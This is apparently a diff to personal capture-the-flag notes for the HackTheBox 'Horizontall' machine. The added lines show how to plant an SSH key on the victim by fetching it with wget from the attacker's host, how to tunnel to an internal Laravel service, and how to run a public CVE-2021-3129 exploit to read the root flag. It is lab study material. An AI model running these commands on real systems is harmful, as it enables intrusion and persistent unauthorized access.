@@ -33,6 +33,7 @@ This gives us 3 entries:
 run http://api-prod.horizontall.htb/admin
 On /admin endpoint we see the server is running Strapi, which is an Headless Node.js CMS.
 
+*PRIVILEGE
 searchsploit strapi 
 
 Strapi 3.0.0-beta - Set Password (Unauthenticated)                                                                   | multiple/webapps/50237.py
@@ -92,5 +93,26 @@ curl -X GET -vv http://localhost:8000
 
 ....
 Laravel v8 (PHP v7.4.18)
+
+on victim
+cd /opt/strapi
+mkdir .ssh
+wget myip:8000/id_rsa.pub 
+mv id_rsa.pub authorized_keys
+
+
+ssh -i ~/.ssh/id_rsa -L 8000:127.0.0.1:8000 strapi@horizontall.htb
+
+https://github.com/nth347/CVE-2021-3129_exploit
+$ git clone https://github.com/nth347/CVE-2021-3129_exploit.git
+$ cd CVE-2021-3129_exploit
+$ chmod +x exploit.py
+$ ./exploit.py http://localhost:8000 Monolog/RCE1 id
+$./exploit.py http://localhost:8000 Monolog/RCE1 "cat /root/root.txt"
+59ca7bfeebd4d4ae07f0874b51cd64ac
+
+https://burakozlu.medium.com/horizontall-walkthrough-htb-250182ab0721
+https://0xandrea.medium.com/horizontall-htb-machine-write-up-67e566f3f7ea
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
 
 
